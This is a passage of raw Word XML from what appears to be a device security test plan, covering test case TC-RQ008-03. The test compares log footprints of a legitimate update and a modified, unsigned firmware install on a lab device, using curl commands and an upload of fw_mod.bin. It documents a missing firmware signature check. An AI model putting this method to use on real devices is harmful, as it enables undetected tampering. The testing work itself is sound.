      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="7B49EA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CC47BD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E8DBED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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="12004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03413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A92D9" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>TC-RQ008-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="00441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3ABBE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052C5" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve">RQ-008 → CR 2.8 (classification </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>intent</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>) → Asset D, Asset I, Asset F</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="2DF41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B73C5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518C5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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Repudiation</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (illegitimate intervention recorded as legitimate)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="47BF8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B1B9A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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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EA1BC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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (Penetration </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="6E480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2D93D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4BA32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Demonstrate that the </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>evidence record cannot distinguish</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> a legitimate update from an illegitimate one: installing a </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>modified/unsigned</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> image**(the install action is performed per TC-RQ005-03)** produces the </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>same</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> log/version footprint as a genuine update — so the "legitimate OR illegitimate" evidence obligation is unmet. </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>The cause (no signature verification) is RQ-005's protection gap; RQ-008 tests only the evidence footprint.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="66DC6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A4E23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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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4876F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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">1. Record the evidence delta of a </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>legitimate</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> update (from TC-RQ008-02). 2. On the spare DUT, install the </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>modified/unsigned</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> image per TC-RQ005-03. 3. Record its evidence delta (log entries, version change, any classification flag). 4. Compare: determine whether any evidence field marks the second install as illegitimate/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>unauthorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="041501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18411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457B1" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Gap-characterisation test.</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected:</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the illegitimate install produces an </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>indistinguishable</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> evidence footprint (same "update completed" semantics + version change, no authenticity flag) → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and a </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL against RQ-008's legitimate/illegitimate requirement</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>. Any evidence field flagging the unsigned image as illegitimate would refute G-2 (document as a positive finding).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="34D95B68" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0002207B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02207B" w:rsidRPr="0002207B" w14:paraId="4F4420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946765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4F5387" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="740EE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3CDDA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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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CDB1E" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>TC-RQ008-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="0D102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EE5E3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63B5C" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve">Spare DUT 192.168.0.2 (per TC-RQ005-03 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>constraints</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve">); Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve"> eth1 = 192.168.50.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="2FE09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33EC6" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B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BF91C" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>curl</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (update + log); </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>binwalk</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">/hex </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>editor</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>modify</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>container</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>, per TC-RQ005-03); Wireshark</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="55F83CC6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># TC-RQ008-03 Compare evidence footprint: legitimate vs modified/unsigned install</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F405BF6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># (A) legitimate install evidence delta = from TC-RQ008-02 (TC0802_logdiff.txt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5314B2A6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># (B) illegitimate install (modified container from TC-RQ005-03):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1672AE" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId205" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0803_log_pre.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643A5806" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"># ...999 + reboot; upload </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>fw_mod.bin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> TC-RQ005-03); POST /firmware/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>install</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>; reboot...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4FBDB7" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId206" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0803_log_post.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672DDFA8" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId207" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/firmware/version</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0803_fwver_post.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65EA297D" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>diff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> TC0803_log_pre.json TC0803_log_post.json | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>tee</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> TC0803_logdiff.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63468B1B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 xml:space="preserve"># Compare (A) vs (B): any field distinguishing </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthorised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24537DD3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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | (B) footprint ≈ (A): update proceeds/attempts identically, no authenticity/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorisation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> flag; unsigned image not classified as illegitimate (no signature check — SRIO-2953, cause = RQ-005). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Indistinguishable (G-2 confirmed) ☐ Illegitimate flagged (investigate) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC0803_logdiff.txt vs TC0802_logdiff.txt comparison table, /firmware/version deltas, install PCAPs; </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>re-flash log</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> with validated image | </w:t>
      </w:r>
      <w:hyperlink r:id="rId208" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="320EDA86" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Boundary note:</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>install of a modified image</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is executed via </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ005-03</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (protection test); RQ-008 consumes its result solely to compare </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>evidence footprints</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of who may update is </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>5-year retention</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the record is </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-012</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId209" w:history="1">
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
